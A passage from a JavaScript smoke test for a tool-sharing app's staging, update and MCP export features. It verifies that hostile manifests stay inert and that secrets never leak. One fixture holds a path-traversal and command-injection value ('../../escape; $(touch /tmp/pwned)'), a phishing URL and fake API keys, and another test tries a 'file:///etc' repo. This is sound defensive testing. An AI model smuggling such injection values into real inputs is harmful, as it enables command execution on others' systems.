  assert.ok(!fs.existsSync(path.join(stageB.stagePath, '.env')))
  const confirmedB = await confirmStagedShare(
    { ...stageB, setupSteps: [] },
    { destination: stageB.destination, env: {}, runSetup: true, launch: false },
    { store: rxStore, processes: rxProcesses, dataRoot: rxRoot },
  )
  assert.equal(confirmedB.outcome, 'saved')
  assert.equal(rxStore.get(confirmedB.tool.id).source.kind, 'bundle')
  assert.equal(rxStore.get(confirmedB.tool.id).source.repo, undefined)
  console.log('OK: bundle receive path stages + saves with bundle provenance')

  // Hostile-manifest receive: the sheet data is inert and nothing persists.
  const hostileRepoDir = path.join(tmp, 'hostile-src')
  writeFixtureProject(hostileRepoDir, { withSecretEnvFile: false })
  fs.writeFileSync(
    path.join(hostileRepoDir, 'shelf.json'),
    JSON.stringify({
      shelfManifest: 1,
      name: '../../escape; $(touch /tmp/pwned)',
      launchCommand: 'node server.mjs',
      url: 'https://phishing.example/',
      bootstrap: ['touch SHOULD_NOT_RUN'],
      env: { OPENAI_API_KEY: 'sk-live-1234567890abcdefghijklmnop' },
    }),
  )
  const hostileBare = path.join(daemonRoot, 'hostile.git')
  execFileSync('git', ['init', '--bare', '-q', '--initial-branch=main', hostileBare])
  git(hostileRepoDir, 'init', '-q', '--initial-branch=main')
  git(hostileRepoDir, 'add', '-A')
  git(hostileRepoDir, 'commit', '-q', '-m', 'hostile')
  git(hostileRepoDir, 'push', '-q', `file://${hostileBare}`, 'main')
  execFileSync('git', ['-C', hostileBare, 'symbolic-ref', 'HEAD', 'refs/heads/main'])
  const stageH = await stageSharedTool({ kind: 'git', repo: `git://127.0.0.1:${daemonPort}/hostile.git` }, { dataRoot: rxRoot, toolsRoot })
  assert.ok(stageH.destination.startsWith(toolsRoot + path.sep), `destination stays under tools root: ${stageH.destination}`)
  assert.equal(path.dirname(stageH.destination), toolsRoot)
  assert.equal(stageH.manifest.url, undefined)
  assert.equal(stageH.manifest.env.OPENAI_API_KEY, '')
  assert.equal(stageH.setupSteps[0].command, 'touch SHOULD_NOT_RUN')
  assert.ok(!fs.existsSync(path.join(stageH.stagePath, 'SHOULD_NOT_RUN')), 'bootstrap did not run at stage time')
  assert.equal(rxStore.list().length, 2, 'nothing persisted by staging')
  discardStagedShare(stageH, rxRoot)
  assert.ok(!fs.existsSync(path.join(rxRoot, 'staging', stageH.stageId)))
  console.log('OK: hostile manifest stages inert — no execution, no persistence, folder contained')

  // Clone failures are structured, not thrown strings.
  await assert.rejects(
    stageSharedTool({ kind: 'git', repo: `git://127.0.0.1:${daemonPort}/missing.git` }, { dataRoot: rxRoot, toolsRoot }),
    (err) => err.code === 'clone_failed',
  )
  await assert.rejects(
    stageSharedTool({ kind: 'git', repo: 'file:///etc' }, { dataRoot: rxRoot, toolsRoot }),
    (err) => err.code === 'invalid_repo',
  )
  await assert.rejects(
    stageSharedTool({ kind: 'bundle', bundlePath: path.join(root, 'package.json') }, { dataRoot: rxRoot, toolsRoot }),
    (err) => err.code === 'bundle_invalid',
  )
  assert.equal(fs.readdirSync(path.join(rxRoot, 'staging')).length, 0, 'failed stages leave no scratch dirs')
  console.log('OK: stage failures are coded and clean up')

  // -------------------------------------------------------------------------
  // 7. Updates: clean → updates_available → fast-forward; diverged → take_theirs.
  // -------------------------------------------------------------------------
  const upToDate = await checkToolUpdates(rxStore.get(rxTool.id))
  assert.equal(upToDate.state, 'up_to_date', JSON.stringify(upToDate))
  assert.equal(await checkToolUpdates({ ...rxTool, source: undefined }).then((r) => r.state), 'not_shared')

  // Sender publishes a change: new capability, new env key, new bootstrap.
  const senderNow = store.save({
    ...store.get(sender.id),
    capabilities: ['batch-optimize images', 'resize photos', 'convert heic'],
    env: { ...store.get(sender.id).env, REPLICATE_TOKEN: 'r8_secretsecretsecret' },
  })
  const prev = JSON.parse(fs.readFileSync(path.join(senderProject, 'shelf.json'), 'utf8'))
  prev.bootstrap = ['npm install', 'npm run prepare-models']
  fs.writeFileSync(path.join(senderProject, 'shelf.json'), JSON.stringify(prev))
  await exportToolManifest(store.get(senderNow.id), { appVersion: '1.2.0-smoke' })
  fs.writeFileSync(path.join(senderProject, 'CHANGELOG.md'), '# 2\n')
  git(senderProject, 'add', '-A')
  git(senderProject, 'commit', '-q', '-m', 'Add HEIC conversion')
  git(senderProject, 'push', '-q', `file://${bare}`, 'main')

  const avail = await checkToolUpdates(rxStore.get(rxTool.id))
  assert.equal(avail.state, 'updates_available', JSON.stringify(avail))
  assert.equal(avail.behind, 1)
  assert.equal(avail.commits.length, 1)
  assert.equal(avail.commits[0].subject, 'Add HEIC conversion')
  assert.ok(avail.manifestDiff.some((d) => d.field === 'capabilities' && /convert heic/.test(d.after)))
  assert.deepEqual(avail.newBootstrap, ['npm run prepare-models'])
  assert.deepEqual(avail.newEnvKeys, ['REPLICATE_TOKEN'])
  assert.ok(!JSON.stringify(avail).includes('r8_secret'), 'update summary carries no secret')
  assert.equal(rxStore.get(rxTool.id).capabilities.length, 2, 'check touches nothing')
  assert.equal(git(confirmed.destination, 'rev-parse', 'HEAD'), stage2.ref, 'check does not move HEAD')
  console.log('OK: clean copy → updates_available with commits + manifest diff, nothing touched')

  // Local rename must survive; capabilities (untouched locally) update.
  rxStore.save({ ...rxStore.get(rxTool.id), name: 'My Prepper' })
  const applied = await applyToolUpdate(rxStore.get(rxTool.id), { mode: 'fast_forward', target: avail.target }, { store: rxStore, processes: rxProcesses })
  assert.equal(applied.ok, true, applied.message)
  assert.equal(applied.ref, avail.remoteRef)
  assert.ok(applied.applied.includes('capabilities'))
  assert.ok(!applied.applied.includes('name'))
  assert.ok(applied.missingEnvKeys.includes('REPLICATE_TOKEN'), 'new key reported as needing a value')
  const updatedTool = rxStore.get(rxTool.id)
  assert.equal(updatedTool.name, 'My Prepper', 'local edit wins')
  assert.deepEqual(updatedTool.capabilities, ['batch-optimize images', 'resize photos', 'convert heic'])
  assert.equal(updatedTool.source.ref, avail.remoteRef)
  assert.ok(updatedTool.source.updatedAt)
  assert.equal(updatedTool.env.OPENAI_API_KEY, 'rx-key-value', 'env values untouched by update')
  assert.ok(!fs.existsSync(path.join(confirmed.destination, 'SHOULD_NOT_RUN')))
  assert.ok(fs.existsSync(path.join(confirmed.destination, 'CHANGELOG.md')))
  assert.equal((await checkToolUpdates(updatedTool)).state, 'up_to_date')
  console.log('OK: fast-forward update applies manifest metadata without clobbering local edits')

  // Diverged: receiver commits locally, sender pushes again.
  fs.writeFileSync(path.join(confirmed.destination, 'LOCAL.md'), 'mine\n')
  git(confirmed.destination, 'add', '-A')
  git(confirmed.destination, 'commit', '-q', '-m', 'Local tweak')
  fs.writeFileSync(path.join(senderProject, 'CHANGELOG.md'), '# 3\n')
  git(senderProject, 'add', '-A')
  git(senderProject, 'commit', '-q', '-m', 'Third')
  git(senderProject, 'push', '-q', `file://${bare}`, 'main')
  const diverged = await checkToolUpdates(rxStore.get(rxTool.id))
  assert.equal(diverged.state, 'diverged', JSON.stringify(diverged))
  assert.equal(diverged.ahead, 1)
  assert.equal(diverged.behind, 1)
  assert.equal(diverged.dirty, false)
  const ffFail = await applyToolUpdate(rxStore.get(rxTool.id), { mode: 'fast_forward', target: diverged.target }, { store: rxStore })
  assert.equal(ffFail.ok, false, 'fast-forward must refuse a diverged copy')
  assert.ok(fs.existsSync(path.join(confirmed.destination, 'LOCAL.md')), 'refusal keeps local work')
  const theirs = await applyToolUpdate(rxStore.get(rxTool.id), { mode: 'take_theirs', target: diverged.target }, { store: rxStore })
  assert.equal(theirs.ok, true, theirs.message)
  assert.equal(theirs.ref, diverged.remoteRef)
  assert.ok(!fs.existsSync(path.join(confirmed.destination, 'LOCAL.md')), 'take_theirs replaced the local commit')
  assert.equal(fs.readFileSync(path.join(confirmed.destination, 'CHANGELOG.md'), 'utf8'), '# 3\n')
  assert.equal((await checkToolUpdates(rxStore.get(rxTool.id))).state, 'up_to_date')
  // Local edits with nothing incoming are NOT "diverged" — there is nothing
  // to take, so no destructive option is offered.
  fs.appendFileSync(path.join(confirmed.destination, 'CHANGELOG.md'), 'uncommitted\n')
  const dirtyOnly = await checkToolUpdates(rxStore.get(rxTool.id))
  assert.equal(dirtyOnly.state, 'up_to_date')
  assert.equal(dirtyOnly.dirty, true)
  // …but dirty + behind is diverged (a hard reset would lose the edits).
  fs.writeFileSync(path.join(senderProject, 'CHANGELOG.md'), '# 4\n')
  git(senderProject, 'add', '-A')
  git(senderProject, 'commit', '-q', '-m', 'Fourth')
  git(senderProject, 'push', '-q', `file://${bare}`, 'main')
  const dirtyBehind = await checkToolUpdates(rxStore.get(rxTool.id))
  assert.equal(dirtyBehind.state, 'diverged')
  assert.equal(dirtyBehind.dirty, true)
  assert.equal(dirtyBehind.behind, 1)
  git(confirmed.destination, 'checkout', '--', 'CHANGELOG.md')
  console.log('OK: diverged copy reported honestly; fast-forward refused, take-theirs resets')

  // Healed port: the receiver's launchCommand was rewritten by port healing;
  // an incoming launchCommand change must still apply, re-pinned to the port.
  // Also: a local rename is reported as skipped, deps changes re-offer setup,
  // and renderer-supplied setup commands not in the manifest never run.
  const healedTool = rxStore.save({
    ...rxStore.get(rxTool.id),
    name: 'Renamed Locally',
    port: 4999,
    launchCommand: 'PORT=4999 node server.mjs',
  })
  const senderAgain = store.save({ ...store.get(sender.id), launchCommand: 'node server.mjs --verbose', name: 'Image Prepper v2' })
  await exportToolManifest(senderAgain, { appVersion: 'x' })
  fs.writeFileSync(path.join(senderProject, 'package.json'), JSON.stringify({ name: 'shared-fixture', private: true, scripts: { start: 'node server.mjs' }, dependencies: {} }))
  git(senderProject, 'add', '-A')
  git(senderProject, 'commit', '-q', '-m', 'Verbose launch')
  git(senderProject, 'push', '-q', `file://${bare}`, 'main')
  const healedCheck = await checkToolUpdates(healedTool)
  assert.equal(healedCheck.state, 'updates_available', JSON.stringify(healedCheck))
  assert.equal(healedCheck.depsChanged, true, 'package.json change flagged')
  assert.ok(healedCheck.newBootstrap.length > 0, 'setup re-offered when deps change')
  const healedApply = await applyToolUpdate(healedTool, {
    mode: 'fast_forward',
    target: healedCheck.target,
    runSetup: true,
    setupCommands: ['touch NEVER_RUN_THIS'],
  }, { store: rxStore, processes: rxProcesses })
  assert.equal(healedApply.ok, true, healedApply.message)
  assert.ok(!fs.existsSync(path.join(confirmed.destination, 'NEVER_RUN_THIS')), 'non-manifest setup command refused main-side')
  assert.equal(healedApply.setup, undefined)
  const healedAfter = rxStore.get(rxTool.id)
  assert.equal(healedAfter.launchCommand, 'PORT=4999 node server.mjs --verbose', 'incoming command applied, re-pinned to the healed port')
  assert.equal(healedAfter.port, 4999)
  assert.equal(healedAfter.name, 'Renamed Locally')
  assert.ok(healedApply.applied.includes('launchCommand'))
  assert.ok(healedApply.skipped.some((x) => x.field === 'name'), 'local rename reported as kept')
  assert.equal(healedApply.running, false)
  console.log('OK: healed-port update re-pins the incoming command; local edits reported as kept')


  // Manifest diff helper sanity.
  const d = diffManifests({ ...reread.manifest, port: 1 }, { ...reread.manifest, port: 2 })
  assert.deepEqual(d, [{ field: 'port', before: '1', after: '2' }])

  // -------------------------------------------------------------------------
  // 8. shelf_export_tool through the real stdio MCP server.
  // -------------------------------------------------------------------------
  const transport = new StdioClientTransport({
    command: 'node',
    args: [path.join(root, 'dist-mcp/mcp/server.js')],
    env: { ...process.env, SHELF_DATA_ROOT: dataRoot },
    stderr: 'pipe',
  })
  const client = new Client({ name: 'shelf-sharing-smoke', version: '0.1.0' })
  await client.connect(transport)
  try {
    const listed = await client.listTools()
    assert.ok(listed.tools.some((t) => t.name === 'shelf_export_tool'))
    assert.ok(!listed.tools.some((t) => t.name === 'shelf_add_shared_tool'), 'agent-driven receive is deliberately absent')
    const res = await client.callTool({ name: 'shelf_export_tool', arguments: { id: sender.id } })
    const text = res.content.find((c) => c.type === 'text').text
    assert.equal(res.isError, undefined, text)
    const out = JSON.parse(text)
    assert.equal(out.manifestPath, path.join(senderProject, 'shelf.json'))
    assert.equal(out.link, buildShareLink(repoUrl))
    assert.ok(!text.includes(secretValue) && !text.includes('hunter2') && !text.includes('r8_secret'), 'MCP output carries no env value')
    assert.deepEqual(Object.keys(out.manifest.env).sort(), ['DATABASE_URL', 'OPENAI_API_KEY', 'PORT', 'REPLICATE_TOKEN'])
    const disk = fs.readFileSync(out.manifestPath, 'utf8')
    assert.ok(!disk.includes(secretValue) && !disk.includes('r8_secret'))
    const missing = await client.callTool({ name: 'shelf_export_tool', arguments: { id: 'nope' } })
    assert.equal(missing.isError, true)
    // A credential in free text is refused server-side, not masked.
    const leakyTool = store.save({ ...store.get(sender.id), id: '', name: 'Leaky', notes: `use ${secretValue}`, projectPath: senderProject })
    const refused = await client.callTool({ name: 'shelf_export_tool', arguments: { id: leakyTool.id } })
    assert.equal(refused.isError, true)
    assert.match(refused.content[0].text, /credential/i)
    store.delete(leakyTool.id)
    console.log('OK: shelf_export_tool over MCP returns path + link with no env values')

    // An agent tweak through shelf_upsert_tool must not un-share a tool.
    const shared = store.save({ ...store.get(sender.id), source: { kind: 'git', repo: repoUrl, ref: 'abc', addedAt: '2026-08-23T00:00:00.000Z' } })
    const tweaked = await client.callTool({ name: 'shelf_upsert_tool', arguments: { id: shared.id, name: shared.name, launchCommand: shared.launchCommand, description: 'agent edit' } })
    assert.equal(tweaked.isError, undefined)
    assert.equal(store.get(shared.id).source?.repo, repoUrl, 'source survives an agent upsert')
    assert.equal(store.get(shared.id).description, 'agent edit')
    console.log('OK: shelf_upsert_tool preserves provenance')
  } finally {
    await client.close()
  }

  console.log('OK: tool sharing smoke passed')
} finally {
  for (const fn of cleanup) {
    try {
      fn()
    } catch {
      // ignore
    }
  }
  try {
    await processes.stopAll?.('smoke done')
  } catch {
    // ignore
  }
  fs.rmSync(tmp, { recursive: true, force: true })
}
